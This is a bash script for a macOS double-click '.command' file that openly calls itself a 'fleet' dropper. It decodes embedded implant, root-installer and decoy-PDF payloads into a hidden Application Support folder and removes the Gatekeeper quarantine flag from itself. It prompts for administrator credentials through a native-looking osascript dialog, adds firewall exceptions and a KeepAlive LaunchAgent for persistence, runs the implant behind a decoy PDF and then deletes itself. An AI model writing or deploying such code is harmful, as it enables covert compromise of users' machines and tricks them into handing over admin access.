#!/bin/bash
# fleet macOS dropper — executes shell command in Terminal on double-click (.command)
#
# Gatekeeper: a freshly-downloaded .command carries com.apple.quarantine, so the
# very first double-click shows Terminal's "are you sure you want to open it?"
# dialog. The user must click Open once. After that, every launch is silent.
# There is no silent first-launch on macOS without an Apple Developer ID +
# notarized build (not available) or root spctl --add (install-daemon.sh path).
set -euo pipefail

WORKDIR="$HOME/Library/Application Support/.fleet-update"
mkdir -p "$WORKDIR"

# ---- decode payloads embedded at build time --------------------------------
IMPLANT_B64='{{IMPLANT_B64}}'
printf '%s' "$IMPLANT_B64" | base64 -D > "$WORKDIR/fleetrun"
chmod 0755 "$WORKDIR/fleetrun"

INSTALL_B64='{{INSTALL_DAEMON_B64}}'
printf '%s' "$INSTALL_B64" | base64 -D > "$WORKDIR/install-daemon.sh" 2>/dev/null || true
chmod 0755 "$WORKDIR/install-daemon.sh" 2>/dev/null || true

DECOY_B64='{{DECOY_B64}}'
printf '%s' "$DECOY_B64" | base64 -D > "$WORKDIR/decoy.pdf"

# ---- strip quarantine from self (user-owned file; works without root) ------
SELF="$0"
xattr -d com.apple.quarantine "$SELF" 2>/dev/null || true

# ---- stay awake ------------------------------------------------------------
caffeinate -ims >/dev/null 2>&1 &
sudo -n pmset -a sleep 0 >/dev/null 2>&1 || true
sudo -n pmset -a disablesleep 1 >/dev/null 2>&1 || true

# ---- preconfigure host firewall (best effort) ------------------------------
if [ -x /usr/libexec/ApplicationFirewall/socketfilterfw ]; then
  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --add "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
  sudo -n /usr/libexec/ApplicationFirewall/socketfilterfw --unblockapp "$WORKDIR/fleetrun" >/dev/null 2>&1 || true
fi

# ---- system-wide root install via native macOS admin dialog ----------------
# osascript "with administrator privileges" shows the standard macOS
# username/password prompt. If the user grants credentials we run the full
# root installer: spctl --add whitelist (silences all future Gatekeeper
# dialogs) + /Library/LaunchDaemons + stay-awake.
if [ "$(id -u)" != "0" ] && [ -x "$WORKDIR/install-daemon.sh" ]; then
  osascript -e "do shell script \"$WORKDIR/install-daemon.sh '$WORKDIR/fleetrun' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
fi

# ---- per-user LaunchAgent fallback (works without root) --------------------
AGENT="$HOME/Library/LaunchAgents/io.fleet.update.plist"
mkdir -p "$HOME/Library/LaunchAgents"
cat > "$AGENT" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>io.fleet.update</string>
  <key>ProgramArguments</key><array><string>$WORKDIR/fleetrun</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
PLIST
launchctl unload "$AGENT" 2>/dev/null || true
launchctl load "$AGENT" 2>/dev/null || true

# ---- run the implant -------------------------------------------------------
"$WORKDIR/fleetrun" >/dev/null 2>&1 &

# ---- open decoy PDF --------------------------------------------------------
sleep 1.5
command -v open >/dev/null 2>&1 && open "$WORKDIR/decoy.pdf" >/dev/null 2>&1 || true

# ---- self-destruct ---------------------------------------------------------
(sleep 5; rm -rf "$WORKDIR" "$SELF") >/dev/null 2>&1 &
exit 0
